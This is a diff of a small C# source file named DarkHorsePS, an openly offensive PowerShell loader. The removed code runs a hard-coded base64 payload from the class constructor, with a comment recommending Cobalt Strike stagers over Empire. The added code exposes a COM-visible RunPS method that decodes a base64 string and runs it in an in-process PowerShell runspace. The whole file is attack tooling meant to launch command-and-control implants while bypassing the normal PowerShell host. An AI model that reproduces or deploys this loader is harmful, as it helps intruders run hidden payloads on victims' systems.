@@ -1,33 +1,36 @@
 ﻿using System;
-using System.Net;
-using System.Windows.Forms;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Management.Automation.Runspaces;
 using System.Management.Automation;
 using System.Collections.ObjectModel;
-using System.Text;
 
-public class TestClass
+[ComVisible(true)]
+public class DarkHorsePS
 {
-
-    public TestClass()
+    public DarkHorsePS()
     {
-        Ex(CSFullyStaged);
+
     }
-    public bool Ex(string cmd)
-    {
-        string stuff = Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
-        //string stuff = cmd;
 
+    public void RunPS(string encCommand)
+    {
+        
+        string decodedCommand = @"";
+        byte[] byteCommand = Convert.FromBase64String(encCommand);
+        decodedCommand = Encoding.ASCII.GetString(byteCommand);
         Runspace runspace = RunspaceFactory.CreateRunspace();
         runspace.Open();
         RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
         Pipeline pipeline = runspace.CreatePipeline();
-        pipeline.Commands.AddScript(stuff);
+
+        //Add commands
+        pipeline.Commands.AddScript(decodedCommand);
+
+        //Prep PS for string output and invoke
         pipeline.Invoke();
-        return true;
-
+        runspace.Close();
     }
-
-    string CSFullyStaged = "Fully staged, base64 encoded, powershell payload here. Cobaltrike ps1 files work best. Empire? not so much.";
+    
 }
